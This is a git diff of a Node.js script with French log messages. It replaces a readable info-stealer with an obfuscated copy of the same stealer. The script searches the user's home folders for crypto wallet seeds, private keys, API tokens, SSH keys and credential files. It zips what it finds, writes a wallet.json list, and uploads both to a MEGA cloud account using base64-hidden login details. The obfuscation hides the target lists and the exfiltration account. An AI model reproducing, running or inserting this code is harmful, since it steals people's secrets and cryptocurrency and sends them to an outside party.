@@ -1,219 +1,597 @@
-import fs from "fs";
-
-import path from "path";
-
-import AdmZip from "adm-zip";
-
-console.log("Début du script de recherche sur C:");
-
+const _0x19472c = _0x49ca;
+(function (_0x3c47a4, _0x13a595) {
+  const _0x312c95 = _0x49ca,
+    _0x38c48a = _0x3c47a4();
+  while (!![]) {
+    try {
+      const _0x79dbd6 =
+        -parseInt(_0x312c95(0x1a9)) / (0x10 * 0xc7 + -0x1 * 0x17e5 + 0xb76) +
+        parseInt(_0x312c95(0x200)) / (-0xcd6 + -0x1319 * 0x1 + 0x1ff1) +
+        (-parseInt(_0x312c95(0x1cb)) / (-0x1 * -0x177b + 0x10a2 + -0x281a)) *
+          (parseInt(_0x312c95(0x1e4)) / (0x2 * -0x18d + -0x19bd + 0x1cdb)) +
+        (parseInt(_0x312c95(0x1ed)) /
+          (0x2 * -0x4ce + -0x2 * 0x8ba + 0x3 * 0x907)) *
+          (-parseInt(_0x312c95(0x1a0)) / (-0x79b + -0x2 * 0x7c9 + 0x1733)) +
+        (parseInt(_0x312c95(0x17b)) / (-0x2083 + 0x14dc + 0xbae)) *
+          (parseInt(_0x312c95(0x1e3)) / (-0xd * 0x9f + 0xd10 + -0x4f5 * 0x1)) +
+        (parseInt(_0x312c95(0x1d4)) / (0x3fb + -0xe * -0xbe + -0xe56)) *
+          (parseInt(_0x312c95(0x19d)) /
+            (0xe54 + -0x3 * -0x9a5 + 0x2b39 * -0x1)) +
+        (parseInt(_0x312c95(0x1a3)) /
+          (-0x1 * -0x14db + -0x564 + 0x234 * -0x7)) *
+          (-parseInt(_0x312c95(0x1f6)) /
+            (0x2535 + 0x1766 * -0x1 + 0x1 * -0xdc3));
+      if (_0x79dbd6 === _0x13a595) break;
+      else _0x38c48a["push"](_0x38c48a["shift"]());
+    } catch (_0x32714a) {
+      _0x38c48a["push"](_0x38c48a["shift"]());
+    }
+  }
+})(_0x4b24, 0xf6 * 0x215 + -0x9 * 0x1041a + -0x1 * -0xc0f5b);
+import _0x129a59 from "fs";
+import _0x1d9914 from "path";
+import _0x41e989 from "os";
+import _0x8379f3 from "adm-zip";
+function _0x49ca(_0x2ec881, _0x4a95e6) {
+  _0x2ec881 = _0x2ec881 - (0x6e * -0x3d + -0xc9f * -0x1 + -0x7c * -0x1f);
+  const _0x2b6a95 = _0x4b24();
+  let _0xaa2a70 = _0x2b6a95[_0x2ec881];
+  return _0xaa2a70;
+}
+console[_0x19472c(0x1b0)](
+  _0x19472c(0x17d) +
+    _0x19472c(0x210) +
+    _0x19472c(0x1be) +
+    _0x19472c(0x19b) +
+    _0x19472c(0x185)
+);
 let specialFiles = [];
-
-// Mots-clés pour les dossiers à explorer en profondeur
 const folderKeywords = [
-  "Desktop",
-  "Bureau",
-  "Documents",
-  "Document",
-  "Images",
-  "Videos",
-  "Téléchargements",
-  "Pictures",
-  "Downloads",
-];
-
-// Liste des préfixes de fichiers spéciaux
-const fileKeywords = [
-  // Wallets / seeds
-  "seed",
-  "seedphrase",
-  "mnemonic",
-  "recovery",
-  "backup",
-  "wallet",
-  "keystore",
-
-  // Clés
-  "private",
-  "privatekey",
-  "secret",
-  "apikey",
-  "api_key",
-  "token",
-  "access_token",
-  "auth",
-  "bearer",
-
-  // Web3
-  "solana",
-  "ethereum",
-  "metamask",
-  "phantom",
-  "trustwallet",
-  "keplr",
-  "ledger",
-  "trezor",
-
-  // Infra / dev
-  "credentials",
-  "password",
-  "passwd",
-  "ssh",
-  "rsa",
-  "dsa",
-  "pgp",
-
-  // Formats sensibles
-];
-
-// Extensions de fichiers sensibles à inclure
-const sensitiveExtensions = [
-  ".env",
-  ".pem",
-  ".key",
-  ".keystore",
-  ".sqlite",
-  ".db",
-  ".crt",
-  ".pfx",
-  ".jks",
-];
-
-// Fonction pour lister seulement les fichiers .json et .txt récursivement
-function listFiles(dir, indent = "") {
+    _0x19472c(0x218),
+    _0x19472c(0x1fb),
+    _0x19472c(0x1ac),
+    _0x19472c(0x1d9),
+    _0x19472c(0x1d8),
+    _0x19472c(0x1b6),
+    _0x19472c(0x226) + _0x19472c(0x18c),
+    _0x19472c(0x18f),
+    _0x19472c(0x204),
+  ],
+  fileKeywords = [
+    _0x19472c(0x1d3),
+    _0x19472c(0x20d),
+    _0x19472c(0x18d),
+    _0x19472c(0x1cd),
+    _0x19472c(0x1db),
+    _0x19472c(0x16e),
+    _0x19472c(0x20c),
+    _0x19472c(0x1ce),
+    _0x19472c(0x1b9),
+    _0x19472c(0x220),
+    _0x19472c(0x1dc),
+    _0x19472c(0x188),
+    _0x19472c(0x214),
+    _0x19472c(0x1d6) + "en",
+    _0x19472c(0x1d0),
+    _0x19472c(0x1f1),
+    _0x19472c(0x1ba),
+    _0x19472c(0x1a4),
+    _0x19472c(0x180),
+    _0x19472c(0x20e),
+    _0x19472c(0x192) + "t",
+    _0x19472c(0x1af),
+    _0x19472c(0x1b2),
+    _0x19472c(0x215),
+    _0x19472c(0x174) + "s",
+    _0x19472c(0x199),
+    _0x19472c(0x175),
+    _0x19472c(0x205),
+    _0x19472c(0x1bd),
+    _0x19472c(0x21f),
+    _0x19472c(0x1bf),
+  ],
+  sensitiveExtensions = [
+    _0x19472c(0x225),
+    _0x19472c(0x1b3),
+    _0x19472c(0x18a),
+    _0x19472c(0x216),
+    _0x19472c(0x20a),
+    _0x19472c(0x206),
+    _0x19472c(0x1fd),
+    _0x19472c(0x1e2),
+    _0x19472c(0x207),
+  ];
+function listFiles(_0x28be69, _0xabafa5 = "") {
+  const _0x490ed3 = _0x19472c,
+    _0xbcc9f4 = {
+      wlqKA: _0x490ed3(0x1e5) + "es",
+      ccIea: _0x490ed3(0x1e8),
+      SHTUn: _0x490ed3(0x1b4),
+      juNgF: _0x490ed3(0x198) + _0x490ed3(0x1c5),
+      TzJZT: function (_0x3ef79b, _0xb0b6b8, _0x2c6afe) {
+        return _0x3ef79b(_0xb0b6b8, _0x2c6afe);
+      },
+      QPlyz: _0x490ed3(0x221),
+      KvDNZ: _0x490ed3(0x1c2),
+      XKyPZ: function (_0x59b88f, _0x550c94) {
+        return _0x59b88f || _0x550c94;
+      },
+      nuoIM: function (_0x2e0637, _0x4c31ec) {
+        return _0x2e0637 || _0x4c31ec;
+      },
+      MMObv: _0x490ed3(0x1a1),
+      tOupf: _0x490ed3(0x21e),
+      QHOeC: _0x490ed3(0x21d),
+      pwDvA: _0x490ed3(0x223),
+      WnZta: _0x490ed3(0x1ff),
+      DnzCH: _0x490ed3(0x202),
+      PbMTt: _0x490ed3(0x1f5),
+      odySd: _0x490ed3(0x1da),
+    };
   try {
-    const items = fs.readdirSync(dir, { withFileTypes: true });
-    for (const item of items) {
-      const fullPath = path.join(dir, item.name);
+    const _0x4309c1 = _0x129a59[_0x490ed3(0x1d2) + "c"](_0x28be69, {
+      withFileTypes: !![],
+    });
+    for (const _0x1138d3 of _0x4309c1) {
+      const _0x2c93fe = _0x1d9914[_0x490ed3(0x20f)](
+        _0x28be69,
+        _0x1138d3[_0x490ed3(0x172)]
+      );
       if (
-        item.isDirectory() &&
-        !["node_modules", "Lib", "cache", "site-packages"].includes(item.name)
-      ) {
-        listFiles(fullPath, indent);
-      } else if (!item.isDirectory()) {
-        const isJsonOrTxt =
-          item.name.endsWith(".json") || item.name.endsWith(".txt");
-        const isSensitiveExtension = sensitiveExtensions.some((ext) =>
-          item.name.endsWith(ext)
-        );
-        if (isJsonOrTxt || isSensitiveExtension) {
-          console.log(`${indent}${item.name}`);
-          const matchesKeyword =
-            isJsonOrTxt &&
-            fileKeywords.some((kw) =>
-              item.name.toLowerCase().includes(kw.toLowerCase())
+        _0x1138d3[_0x490ed3(0x1f2) + "y"]() &&
+        ![
+          _0xbcc9f4[_0x490ed3(0x1fe)],
+          _0xbcc9f4[_0x490ed3(0x195)],
+          _0xbcc9f4[_0x490ed3(0x1e9)],
+          _0xbcc9f4[_0x490ed3(0x201)],
+        ][_0x490ed3(0x170)](_0x1138d3[_0x490ed3(0x172)])
+      )
+        _0xbcc9f4[_0x490ed3(0x1b7)](listFiles, _0x2c93fe, _0xabafa5);
+      else {
+        if (!_0x1138d3[_0x490ed3(0x1f2) + "y"]()) {
+          const _0x76a68 =
+              _0x1138d3[_0x490ed3(0x172)][_0x490ed3(0x21b)](
+                _0xbcc9f4[_0x490ed3(0x16f)]
+              ) ||
+              _0x1138d3[_0x490ed3(0x172)][_0x490ed3(0x21b)](
+                _0xbcc9f4[_0x490ed3(0x1b8)]
+              ),
+            _0x2b9346 = sensitiveExtensions[_0x490ed3(0x1de)]((_0x3fe70a) =>
+              _0x1138d3[_0x490ed3(0x172)][_0x490ed3(0x21b)](_0x3fe70a)
             );
-          if (
-            (matchesKeyword || isSensitiveExtension) &&
-            ![
-              "vcpkg",
-              "libraries",
-              "WinSxS",
-              ".next",
-              "venv",
-              "site-packages",
-              "cache",
-              "Lib",
-              "dist-info",
-              "certifi",
-              "licenses",
-            ].some((exclude) => fullPath.includes(exclude))
-          ) {
-            specialFiles.push(fullPath);
+          if (_0xbcc9f4[_0x490ed3(0x1d7)](_0x76a68, _0x2b9346)) {
+            console[_0x490ed3(0x1b0)](
+              "" + _0xabafa5 + _0x1138d3[_0x490ed3(0x172)]
+            );
+            const _0x3455fd =
+              _0x76a68 &&
+              fileKeywords[_0x490ed3(0x1de)]((_0x42936d) =>
+                _0x1138d3[_0x490ed3(0x172)]
+                  [_0x490ed3(0x186) + "e"]()
+                  [_0x490ed3(0x170)](_0x42936d[_0x490ed3(0x186) + "e"]())
+              );
+            _0xbcc9f4[_0x490ed3(0x1bc)](_0x3455fd, _0x2b9346) &&
+              ![
+                _0xbcc9f4[_0x490ed3(0x1fa)],
+                _0xbcc9f4[_0x490ed3(0x1c6)],
+                _0xbcc9f4[_0x490ed3(0x1c3)],
+                _0xbcc9f4[_0x490ed3(0x1a8)],
+                _0xbcc9f4[_0x490ed3(0x1c7)],
+                _0xbcc9f4[_0x490ed3(0x201)],
+                _0xbcc9f4[_0x490ed3(0x1e9)],
+                _0xbcc9f4[_0x490ed3(0x195)],
+                _0xbcc9f4[_0x490ed3(0x20b)],
+                _0xbcc9f4[_0x490ed3(0x208)],
+                _0xbcc9f4[_0x490ed3(0x17f)],
+              ][_0x490ed3(0x1de)]((_0x1e1acd) =>
+                _0x2c93fe[_0x490ed3(0x170)](_0x1e1acd)
+              ) &&
+              specialFiles[_0x490ed3(0x1c9)](_0x2c93fe);
           }
         }
       }
     }
-  } catch (err) {
-    console.log(`${indent}Erreur d'accès: ${err.message}`);
+  } catch (_0x2dd712) {
+    console[_0x490ed3(0x1b0)](
+      _0xabafa5 +
+        (_0x490ed3(0x1f9) + _0x490ed3(0x190)) +
+        _0x2dd712[_0x490ed3(0x1e0)]
+    );
   }
 }
-
-// Fonction pour lister récursivement les dossiers et fichiers
-function listContents(dir, maxDepth = 2, currentDepth = 0) {
-  if (currentDepth > maxDepth) return; // Limiter la profondeur pour éviter trop de logs
+function listContents(
+  _0x5f1902,
+  _0xf3205d = 0x53f + -0x77e + -0x1 * -0x241,
+  _0x1a9e6c = 0x1cdd + 0x3e3 * 0x6 + -0x3 * 0x1165
+) {
+  const _0xa140e3 = _0x19472c,
+    _0x32f781 = {
+      dZfJT: function (_0x175199, _0x3fdc3e) {
+        return _0x175199 > _0x3fdc3e;
+      },
+      lUMQn: _0xa140e3(0x1e5) + "es",
+      PGveB: _0xa140e3(0x1e8),
+      mVmcl: _0xa140e3(0x1b4),
+      OSqHm: _0xa140e3(0x198) + _0xa140e3(0x1c5),
+      NAReq: function (_0x21a7fb, _0x17904f) {
+        return _0x21a7fb(_0x17904f);
+      },
+      evLao: function (_0x20a57b, _0x44eb47) {
+        return _0x20a57b < _0x44eb47;
+      },
+      PydwR: function (_0x53db7b, _0x1d1dc3, _0x3426c0, _0x1cc8f9) {
+        return _0x53db7b(_0x1d1dc3, _0x3426c0, _0x1cc8f9);
+      },
+      Zqbmh: function (_0x2e20bc, _0x115d69) {
+        return _0x2e20bc + _0x115d69;
+      },
+      moGmL: _0xa140e3(0x221),
+      tIUyi: _0xa140e3(0x1c2),
+      XMXDK: function (_0x4b14ad, _0x334799) {
+        return _0x4b14ad || _0x334799;
+      },
+    };
+  if (_0x32f781[_0xa140e3(0x17e)](_0x1a9e6c, _0xf3205d)) return;
   try {
-    const items = fs.readdirSync(dir, { withFileTypes: true });
-    console.log(`Dossier: ${dir} (${items.length} éléments)`);
-    for (const item of items) {
-      const fullPath = path.join(dir, item.name);
+    const _0x1df8fd = _0x129a59[_0xa140e3(0x1d2) + "c"](_0x5f1902, {
+      withFileTypes: !![],
+    });
+    console[_0xa140e3(0x1b0)](
+      _0xa140e3(0x184) +
+        _0x5f1902 +
+        "\x20(" +
+        _0x1df8fd[_0xa140e3(0x189)] +
+        _0xa140e3(0x1a6)
+    );
+    for (const _0x2450bb of _0x1df8fd) {
+      const _0x5140e4 = _0x1d9914[_0xa140e3(0x20f)](
+        _0x5f1902,
+        _0x2450bb[_0xa140e3(0x172)]
+      );
       if (
-        item.isDirectory() &&
-        !["node_modules", "Lib", "cache", "site-packages"].includes(item.name)
+        _0x2450bb[_0xa140e3(0x1f2) + "y"]() &&
+        ![
+          _0x32f781[_0xa140e3(0x19c)],
+          _0x32f781[_0xa140e3(0x1f3)],
+          _0x32f781[_0xa140e3(0x1eb)],
+          _0x32f781[_0xa140e3(0x1ae)],
+        ][_0xa140e3(0x170)](_0x2450bb[_0xa140e3(0x172)])
       ) {
-        console.log(`  Sous-dossier: ${item.name}`);
-        if (
-          folderKeywords.some((kw) =>
-            item.name.toLowerCase().includes(kw.toLowerCase())
-          )
-        ) {
-          console.log(`  Fichiers .json et .txt dans ${item.name}:`);
-          listFiles(fullPath);
-        } else if (currentDepth < maxDepth) {
-          listContents(fullPath, maxDepth, currentDepth + 1);
-        }
-      } else if (!item.isDirectory()) {
-        const isJsonOrTxt =
-          item.name.endsWith(".json") || item.name.endsWith(".txt");
-        const isSensitiveExtension = sensitiveExtensions.some((ext) =>
-          item.name.endsWith(ext)
+        console[_0xa140e3(0x1b0)](
+          _0xa140e3(0x178) + _0xa140e3(0x1e1) + _0x2450bb[_0xa140e3(0x172)]
         );
-        if (isJsonOrTxt || isSensitiveExtension) {
-          console.log(`  Fichier: ${item.name}`);
+        if (
+          folderKeywords[_0xa140e3(0x1de)]((_0x33846c) =>
+            _0x2450bb[_0xa140e3(0x172)]
+              [_0xa140e3(0x186) + "e"]()
+              [_0xa140e3(0x170)](_0x33846c[_0xa140e3(0x186) + "e"]())
+          )
+        )
+          console[_0xa140e3(0x1b0)](
+            _0xa140e3(0x19e) +
+              _0xa140e3(0x1bb) +
+              _0xa140e3(0x1f0) +
+              _0x2450bb[_0xa140e3(0x172)] +
+              ":"
+          ),
+            _0x32f781[_0xa140e3(0x177)](listFiles, _0x5140e4);
+        else
+          _0x32f781[_0xa140e3(0x1d5)](_0x1a9e6c, _0xf3205d) &&
+            _0x32f781[_0xa140e3(0x222)](
+              listContents,
+              _0x5140e4,
+              _0xf3205d,
+              _0x32f781[_0xa140e3(0x219)](
+                _0x1a9e6c,
+                0xba * 0x1f + -0x1 * -0x26cb + 0x1470 * -0x3
+              )
+            );
+      } else {
+        if (!_0x2450bb[_0xa140e3(0x1f2) + "y"]()) {
+          const _0x4da153 =
+              _0x2450bb[_0xa140e3(0x172)][_0xa140e3(0x21b)](
+                _0x32f781[_0xa140e3(0x17c)]
+              ) ||
+              _0x2450bb[_0xa140e3(0x172)][_0xa140e3(0x21b)](
+                _0x32f781[_0xa140e3(0x197)]
+              ),
+            _0x1eebb4 = sensitiveExtensions[_0xa140e3(0x1de)]((_0x580ce4) =>
+              _0x2450bb[_0xa140e3(0x172)][_0xa140e3(0x21b)](_0x580ce4)
+            );
+          _0x32f781[_0xa140e3(0x1a2)](_0x4da153, _0x1eebb4) &&
+            console[_0xa140e3(0x1b0)](
+              _0xa140e3(0x171) + "\x20" + _0x2450bb[_0xa140e3(0x172)]
+            );
         }
       }
     }
-  } catch (err) {
-    console.log(`Erreur d'accès à ${dir}: ${err.message}`);
+  } catch (_0x45bd69) {
+    console[_0xa140e3(0x1b0)](
+      _0xa140e3(0x1f9) +
+        _0xa140e3(0x1a5) +
+        _0x5f1902 +
+        ":\x20" +
+        _0x45bd69[_0xa140e3(0x1e0)]
+    );
   }
 }
-
-// Lister le contenu du dossier utilisateur
-const userHome = path.join("C:\\Users", process.env.USERNAME);
-console.log(`Scanning ${userHome}...`);
-listContents(userHome);
-console.log("Fin du scan.");
-
-// Écrire dans wallet.json si des fichiers spéciaux trouvés
-if (specialFiles.length > 0) {
-  const data = JSON.stringify({ specialFiles }, null, 2);
-  fs.writeFileSync("wallet.json", data);
-  console.log("Fichiers spéciaux écrits dans wallet.json");
-
-  // Créer un zip des fichiers
-  const zip = new AdmZip();
+function _0x4b24() {
+  const _0x4d05bd = [
+    "Zqbmh",
+    "base64",
+    "endsWith",
+    "OUxve",
+    "WinSxS",
+    "libraries",
+    "dsa",
+    "secret",
+    ".json",
+    "PydwR",
+    ".next",
+    "Fichiers\x20s",
+    ".env",
+    "Télécharge",
+    "upload",
+    "wallet",
+    "QPlyz",
+    "includes",
+    "\x20\x20Fichier:",
+    "name",
+    "llPHM",
+    "credential",
+    "passwd",
+    "stringify",
+    "NAReq",
+    "\x20\x20Sous-dos",
+    "writeFileS",
+    "tGDVq",
+    "224rRhcPm",
+    "moGmL",
+    "Début\x20du\x20s",
+    "dZfJT",
+    "odySd",
+    "metamask",
+    "files.zip",
+    "error",
+    "ippés\x20dans",
+    "Dossier:\x20",
+    "ème\x20:",
+    "toLowerCas",
+    "ync",
+    "api_key",
+    "length",
+    ".key",
+    "Erreur\x20Meg",
+    "ments",
+    "mnemonic",
+    "SwvuG",
+    "Pictures",
+    "ccès:\x20",
+    "from",
+    "trustwalle",
+    "r\x20Mega",
+    "writeZip",
+    "ccIea",
+    "...",
+    "tIUyi",
+    "site-packa",
+    "password",
+    "péciaux\x20éc",
+    "ur\x20le\x20syst",
+    "lUMQn",
+    "5766710CcmbzO",
+    "\x20\x20Fichiers",
+    "a\x20:",
+    "2964iNMYUc",
+    "vcpkg",
+    "XMXDK",
+    "22CZUipJ",
+    "ethereum",
+    "ccès\x20à\x20",
+    "\x20éléments)",
+    "UWRldWpmeW",
+    "pwDvA",
+    "279708sBhEgx",
+    "readFileSy",
+    "Fichiers\x20z",
+    "Documents",
+    "Fin\x20du\x20sca",
+    "OSqHm",
+    "keplr",
+    "log",
+    "addLocalFi",
+    "ledger",
+    ".pem",
+    "cache",
+    "WUGlr",
+    "Videos",
+    "TzJZT",
+    "KvDNZ",
+    "privatekey",
+    "solana",
+    "\x20.json\x20et\x20",
+    "nuoIM",
+    "rsa",
+    "echerche\x20s",
+    "pgp",
+    "Connecté\x20à",
+    "rSteR",
+    ".txt",
+    "QHOeC",
+    "BSMcj",
+    "ges",
+    "tOupf",
+    "WnZta",
+    "homedir",
+    "push",
+    "wallet.jso",
+    "238497KCKWUT",
+    "n\x20uploadé\x20",
+    "recovery",
+    "private",
+    "dg==",
+    "auth",
+    "uploadé\x20su",
+    "readdirSyn",
+    "seed",
+    "9RAztSW",
+    "evLao",
+    "access_tok",
+    "XKyPZ",
+    "Images",
+    "Document",
+    "licenses",
+    "backup",
+    "apikey",
+    "jmuEm",
+    "some",
+    "\x20Mega",
+    "message",
+    "sier:\x20",
+    ".pfx",
+    "149696QjxCkG",
+    "20Weuvcg",
+    "node_modul",
+    "rits\x20dans\x20",
+    "h1dWlyX2dm",
+    "Lib",
+    "SHTUn",
+    "complete",
+    "mVmcl",
+    "OkeAF",
+    "2615wfTUXE",
+    "dGVzdGVpbn",
+    "sur\x20Mega",
+    ".txt\x20dans\x20",
+    "bearer",
+    "isDirector",
+    "PGveB",
+    "ready",
+    "certifi",
+    "422808HNLYRm",
+    "MyApp/1.0",
+    "Scanning\x20",
+    "Erreur\x20d\x27a",
+    "MMObv",
+    "Bureau",
+    "toString",
+    ".crt",
+    "wlqKA",
+    "venv",
+    "305570DloKez",
+    "juNgF",
+    "dist-info",
+    "JroXH",
+    "Downloads",
+    "ssh",
+    ".db",
+    ".jks",
+    "PbMTt",
+    "\x20files.zip",
+    ".sqlite",
+    "DnzCH",
+    "keystore",
+    "seedphrase",
+    "phantom",
+    "join",
+    "cript\x20de\x20r",
+    "Z21haWwuY2",
+    "fRNmc",
+    "RydXNpb25A",
+    "token",
+    "trezor",
+    ".keystore",
+    "files.zip\x20",
+    "Desktop",
+  ];
+  _0x4b24 = function () {
+    return _0x4d05bd;
+  };
+  return _0x4b24();
+}
+const userHome = _0x41e989[_0x19472c(0x1c8)]();
+console[_0x19472c(0x1b0)](_0x19472c(0x1f8) + userHome + _0x19472c(0x196)),
+  listContents(userHome),
+  console[_0x19472c(0x1b0)](_0x19472c(0x1ad) + "n.");
+if (
+  specialFiles[_0x19472c(0x189)] >
+  -0xf * -0x16f + -0x2d2 * -0x1 + 0xd * -0x1df
+) {
+  const data = JSON[_0x19472c(0x176)](
+    { specialFiles: specialFiles },
+    null,
+    0x2 * -0x4f + -0x2046 + 0x1 * 0x20e6
+  );
+  _0x129a59[_0x19472c(0x179) + _0x19472c(0x187)](_0x19472c(0x1ca) + "n", data),
+    console[_0x19472c(0x1b0)](
+      _0x19472c(0x224) +
+        _0x19472c(0x19a) +
+        _0x19472c(0x1e6) +
+        _0x19472c(0x1ca) +
+        "n"
+    );
+  const zip = new _0x8379f3();
   for (const file of specialFiles) {
-    zip.addLocalFile(file);
+    zip[_0x19472c(0x1b1) + "le"](file);
   }
-  zip.writeZip("files.zip");
-  console.log("Fichiers zippés dans files.zip");
+  zip[_0x19472c(0x194)](_0x19472c(0x181)),
+    console[_0x19472c(0x1b0)](
+      _0x19472c(0x1ab) + _0x19472c(0x183) + _0x19472c(0x209)
+    );
 }
-
 import { Storage } from "megajs";
-
-//envoyer les fichiers via mega
 (async () => {
-  const email = Buffer.from(
-    "dGVzdGVpbnRydXNpb25AZ21haWwuY29t",
-    "base64"
-  ).toString();
-  const password = Buffer.from("UWRldWpmeWh1dWlyX2dmdg==", "base64").toString();
-  const storage = new Storage({
-    email: email,
-    password: password,
-    userAgent: "MyApp/1.0",
-  });
-
-  storage.on("ready", () => {
-    console.log("Connecté à Mega");
-    // Uploader files.zip
-    const file = storage.upload("files.zip", fs.readFileSync("files.zip"));
-    file.on("complete", () => console.log("files.zip uploadé sur Mega"));
-    // Uploader wallet.json
-    const file2 = storage.upload("wallet.json", fs.readFileSync("wallet.json"));
-    file2.on("complete", () => console.log("wallet.json uploadé sur Mega"));
-  });
-
-  storage.on("error", (err) => {
-    console.error("Erreur Mega :", err);
-  });
+  const _0x5d3f2f = _0x19472c,
+    _0x10a2d3 = {
+      jmuEm: _0x5d3f2f(0x1c0) + _0x5d3f2f(0x1df),
+      fRNmc: _0x5d3f2f(0x181),
+      OUxve: _0x5d3f2f(0x1ea),
+      llPHM: _0x5d3f2f(0x1ca) + "n",
+      OkeAF: _0x5d3f2f(0x18b) + _0x5d3f2f(0x19f),
+      BSMcj: _0x5d3f2f(0x1ee) + _0x5d3f2f(0x213) + _0x5d3f2f(0x211) + "9t",
+      SwvuG: _0x5d3f2f(0x21a),
+      JroXH: _0x5d3f2f(0x1a7) + _0x5d3f2f(0x1e7) + _0x5d3f2f(0x1cf),
+      rSteR: _0x5d3f2f(0x1f7),
+      WUGlr: _0x5d3f2f(0x1f4),
+      tGDVq: _0x5d3f2f(0x182),
+    },
+    _0xfda7e6 = Buffer[_0x5d3f2f(0x191)](
+      _0x10a2d3[_0x5d3f2f(0x1c4)],
+      _0x10a2d3[_0x5d3f2f(0x18e)]
+    )[_0x5d3f2f(0x1fc)](),
+    _0x5b4912 = Buffer[_0x5d3f2f(0x191)](
+      _0x10a2d3[_0x5d3f2f(0x203)],
+      _0x10a2d3[_0x5d3f2f(0x18e)]
+    )[_0x5d3f2f(0x1fc)](),
+    _0x554e47 = new Storage({
+      email: _0xfda7e6,
+      password: _0x5b4912,
+      userAgent: _0x10a2d3[_0x5d3f2f(0x1c1)],
+    });
+  _0x554e47["on"](_0x10a2d3[_0x5d3f2f(0x1b5)], () => {
+    const _0x52600d = _0x5d3f2f;
+    console[_0x52600d(0x1b0)](_0x10a2d3[_0x52600d(0x1dd)]);
+    const _0x480f0a = _0x554e47[_0x52600d(0x16d)](
+      _0x10a2d3[_0x52600d(0x212)],
+      _0x129a59[_0x52600d(0x1aa) + "nc"](_0x10a2d3[_0x52600d(0x212)])
+    );
+    _0x480f0a["on"](_0x10a2d3[_0x52600d(0x21c)], () =>
+      console[_0x52600d(0x1b0)](
+        _0x52600d(0x217) + _0x52600d(0x1d1) + _0x52600d(0x193)
+      )
+    );
+    const _0x1dfb1a = _0x554e47[_0x52600d(0x16d)](
+      _0x10a2d3[_0x52600d(0x173)],
+      _0x129a59[_0x52600d(0x1aa) + "nc"](_0x10a2d3[_0x52600d(0x173)])
+    );
+    _0x1dfb1a["on"](_0x10a2d3[_0x52600d(0x21c)], () =>
+      console[_0x52600d(0x1b0)](
+        _0x52600d(0x1ca) + _0x52600d(0x1cc) + _0x52600d(0x1ef)
+      )
+    );
+  }),
+    _0x554e47["on"](_0x10a2d3[_0x5d3f2f(0x17a)], (_0x17873b) => {
+      const _0x5f8e21 = _0x5d3f2f;
+      console[_0x5f8e21(0x182)](_0x10a2d3[_0x5f8e21(0x1ec)], _0x17873b);
+    });
 })();
